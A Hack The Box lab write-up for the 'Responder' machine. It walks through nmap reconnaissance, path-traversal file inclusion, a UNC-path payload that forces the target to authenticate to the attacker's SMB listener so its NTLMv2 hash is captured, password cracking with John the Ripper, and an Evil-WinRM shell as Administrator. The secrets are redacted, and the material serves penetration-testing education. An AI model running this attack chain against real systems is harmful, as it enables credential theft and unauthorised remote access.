# Responder
#HTB #very-easy #evil-winrm #john #responder #Web #remote-access #UNC #networks-services
## Target:
*Name:* Responder

*IP:* 10.129.129.69
## Vulnerability:
The web application contains file inclusion vulnerability through `page` parameter that allows it to load local files or remote SMB shares using UNC paths.

> [!NOTE] 
UNC (Universal Naming Convention) path is a standard format used in Windows to find shared files, folders, and printers on a local network.
*Format: `\\servername\sharename\folder\file`*
## Steps:
#### 1) Reconnaissance
We used nmap to identify open ports and services running on them.

**Code:**
```
nmap -sV 10.129.129.69 
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-30 10:35 -0400
Nmap scan report for 10.129.129.69
Host is up (0.026s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 (OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: unika.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.28 seconds
```
The scan identified two open ports:
- **Port 80 (HTTP):** Running Apache HTTP Server 2.4.52. This is likely the main web application, so it will be the first service to investigate.
- **Port 5985 (HTTP):** Running Microsoft HTTPAPI 2.0. This port is commonly associated with Windows Remote Management (WinRM), which allows remote administration over HTTP. If valid Windows credentials are discovered later, this service may provide remote access to the target.
#### 2) Investigating the Web application
<img width="2559" height="1282" alt="image" src="https://github.com/user-attachments/assets/3ccfd0cb-0eca-4cda-93e7-86394c01593b" />

Accessing the target redirected us to `unika.htb`, but the connection failed because the hostname was not defined in our local `/etc/hosts` file.
We need to add the host and it's ip address to the file, using the command:
```
echo "10.129.129.69 unika.htb" | sudo tee -a /etc/hosts
```
After that, we were able to access the website successfully.
<img width="2559" height="1343" alt="image" src="https://github.com/user-attachments/assets/a7aaf069-1a0f-43cf-9898-637c4de80f67" />

#### 3) Identifying the vulnerability
While browsing the website, we found that it allows changing the language parameter for example to french, using the URL :
```
http://unika.htb/index.php?page=french.html
```

The `page` parameter appears to load files from the server. This suggests a possible **Local File Inclusion (LFI)** vulnerability.

We tested whether the parameter could access local files:
**URL:**
```
http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts
```
**Result:**
<img width="2559" height="468" alt="image" src="https://github.com/user-attachments/assets/4a1b7cdd-e064-484f-8eb0-30ce74455b61" />

The server returned the content of the file, confirming that the parameter is vulnerable to file inclusion.
Since the target system was running Windows (from nmap scan), the application could also process UNC paths, allowing files to be requested from remote SMB shares rather than only from the local filesystem.
When the server attempts to access a remote SMB share, it must authenticate with the remote machine using Windows authentication mechanisms. The exact authentication protocol depends on the environment configuration.

We can use this behavior to capture Windows authentication information by using Responder to create a fake SMB service. When the Windows machine attempts to access this SMB share, it may send an authentication request that can be captured by Responder.

#### 4) Using Responder
Initially, we'll start the fake SMB service using Responder:

**Code:**
```
sudo python3 Responder.py -I tun0
```
Then, we request a page from our machine using the URL:
```
http://unika.htb/index.php?page=//10.10.15.37/hehehee
```

> [!NOTE] 
 `10.10.15.37` is the attacker's machine IP.

After that request, Responder captured the credentials sent by the target machine to authenticate:
```
[SMB] NTLMv2-SSP Client   : 10.129.129.69
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:<REDACTED>                                        
```
The captured authentication data was identified as NTLMv2 by Responder.

#### 5) Cracking the password
Next, we'll use `john the ripper` tool to recover the plain text password from NTMLv2 authentication data.

**Code:**
```
john hash.txt -w=/usr/share/wordlists/rockyou.txt
```

> [!NOTE] 
`hash.txt` contains the NTLMv2 data.

**Result:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>        (Administrator)     
1g 0:00:00:00 DONE (2026-07-30 11:30) 9.090g/s 37236p/s 37236c/s 37236C/s adriano..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
`john the ripper` revealed the password for `Administrator` user, which is `<PASSWORD>`

#### 6) Remote access to the target machine
**Code:**
```
evil-winrm -i 10.129.129.69 -u Administrator
```
**Result:**
```
Enter Password: (Entered <PASSWORD>)

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

We successfully accessed the target machine using `evil-winrm` tool.
#### 7) Searching for the flag
**Full searching process:**
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/11/2020   7:19 AM                3D Objects
d-r---        10/11/2020   7:19 AM                Contacts
d-r---          3/9/2022   5:34 PM                Desktop
d-r---         3/10/2022   4:51 AM                Documents
d-r---        10/11/2020   7:19 AM                Downloads
d-r---        10/11/2020   7:19 AM                Favorites
d-r---        10/11/2020   7:19 AM                Links
d-r---        10/11/2020   7:19 AM                Music
d-r---         4/27/2020   6:01 AM                OneDrive
d-r---        10/11/2020   7:19 AM                Pictures
d-r---        10/11/2020   7:19 AM                Saved Games
d-r---        10/11/2020   7:19 AM                Searches
d-r---        10/11/2020   7:19 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> ls


    Directory: C:\Users\mike


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop


*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> ls


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt

*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
<FLAG>
```

## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
- File inclusion vulnerabilities can allow applications to load resources from unintended locations, including remote SMB shares.
- Windows systems may authenticate automatically when accessing SMB resources, exposing authentication exchanges.
- Responder can be used to capture these authentication attempts, which can then be analyzed and cracked to recover the user's password.
- Recovered credentials can be used to access remote services such as WinRM and gain command execution on the target machine.
